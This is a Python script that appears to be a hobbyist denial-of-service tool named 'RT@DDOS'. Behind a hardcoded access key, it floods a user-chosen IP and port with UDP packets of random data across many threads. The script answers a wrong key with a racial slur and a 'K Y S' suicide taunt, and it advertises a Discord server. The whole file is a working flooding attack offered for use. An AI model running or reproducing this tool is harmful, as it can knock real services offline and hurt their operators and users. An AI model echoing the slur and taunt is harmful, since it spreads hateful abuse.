from colorama import Fore, Back
import random, time, socket, os, threading

def clear():
    os.system("cls" if os.name == "nt" else "clear")

clear()

print(f"{Fore.RED}Made By Ratiela#5453")
print(f"Discord Server: https://discord.gg/8wKYeUakna{Fore.RESET}")
key = input("🔑 Key: ")



if key == "rtddos":
    pass

else:
    print("Wrong Key, K Y S Nigga 💀")
    quit()

os.system("cls" if os.name == "nt" else "clear")



print(f"{Fore.RED}Made By Ratiela#5453")
print(f"Discord Server: https://discord.gg/8wKYeUakna{Fore.RESET}")
welcome = f"""{Fore.LIGHTRED_EX}
\t\t\t\t\t▄▄▄  ▄▄▄▄▄·▄▄▄▄  ·▄▄▄▄        .▄▄ · 
\t\t\t\t\t▀▄ █·•██  ██▪ ██ ██▪ ██ ▪     ▐█ ▀. 
\t\t\t\t\t▐▀▀▄  ▐█.▪▐█· ▐█▌▐█· ▐█▌ ▄█▀▄ ▄▀▀▀█▄
\t\t\t\t\t▐█•█▌ ▐█▌·██. ██ ██. ██ ▐█▌.▐▌▐█▄▪▐█
\t\t\t\t\t.▀  ▀ ▀▀▀ ▀▀▀▀▀• ▀▀▀▀▀•  ▀█▄▀▪ ▀▀▀▀ {Fore.RESET}
\t\t\t\t\t
\t\t\t\t\t       Type help For Usage
\t\t\t\t\t"""

print(welcome)

while True:
    rt = input("RT@DDOS > ")

    if rt == "help" or rt == "HELP" or rt == "Help":
        print("""
╔════════════════════════════════════════════════════════╗
║  !attack For Attacking                                 ║
║  cls or clear For Terminal Clearing                    ║
║  !exit For Exit                                        ║
╚════════════════════════════════════════════════════════╝
        """)

    elif rt == "!attack" or rt == "!ATTACK" or rt == "!Attack":
        ip = input("Target IP: ")
        port = int(input("Target Port: "))
        threads = int(input("Amount Of Threads: "))

        def attack():
            attack = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

            attack.connect((ip, port))

            for i in range(1, 100 * 1000):
                try:
                    attack.send(random._urandom(10) * 1000)
                except ConnectionRefusedError:
                    pass
            print(f"Send: {i}", end='\r')

        for i in range(threads):
            t = threading.Thread(target=attack)
            t.start()

    elif rt == "cls" or rt == "CLS" or rt == "clear" or rt == "CLEAR" or rt == "Cls" or rt == "Clear":
        clear()
        print(welcome)
    elif rt == "!exit" or rt == "!EXIT" or rt == "!Exit":
        quit()